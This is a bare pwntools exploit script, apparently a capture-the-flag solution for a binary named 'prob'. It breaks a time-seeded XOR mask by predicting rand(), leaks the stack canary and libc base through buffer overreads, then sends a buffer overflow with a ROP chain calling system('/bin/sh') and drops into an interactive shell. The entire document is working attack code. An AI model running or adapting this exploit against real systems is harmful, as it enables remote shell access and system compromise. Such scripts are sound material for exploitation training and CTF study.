from pwn import *
import ctypes

REMOTE = True
libc = ctypes.CDLL("/lib/x86_64-linux-gnu/libc.so.6")
libc.srand(int(time.time()))
context.log_level = "debug"

if REMOTE:
    io = remote(sys.argv[1], int(sys.argv[2]))

else:
    io = process("./prob")

io.sendafter(b"> ", b"A"*137)
key = libc.rand() & 0xFF
sleep(0.1)
leak = io.recvuntil(b"> ")
leak_origin = b"".join([bytes([leak[i] ^ key]) for i in range(len(leak))])

canary = u64(leak_origin[136:144]) - 0x41

io.success(f"canary @ {hex(canary)}")

io.send(b"A"*168)
key = libc.rand() & 0xFF
leak = io.recvuntil(b"> ")
leak_origin = b"".join([bytes([leak[i] ^ key]) for i in range(len(leak))])
libc_base = u64(leak_origin[168:168+6].ljust(8, b"\x00")) - 0x29d90
libc = ELF("./libc.so.6")

pop_rdi = libc_base + 0x2a3e5
binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
system = libc_base + libc.symbols["system"]
io.success(f"libc_base @ {hex(libc_base)}")

payload = b"A" * 136 + p64(canary) + b"A" * 24 + p64(pop_rdi + 1) + p64(pop_rdi) + p64(binsh) + p64(system)

io.send(payload)
io.sendline(b"exit")

io.interactive()
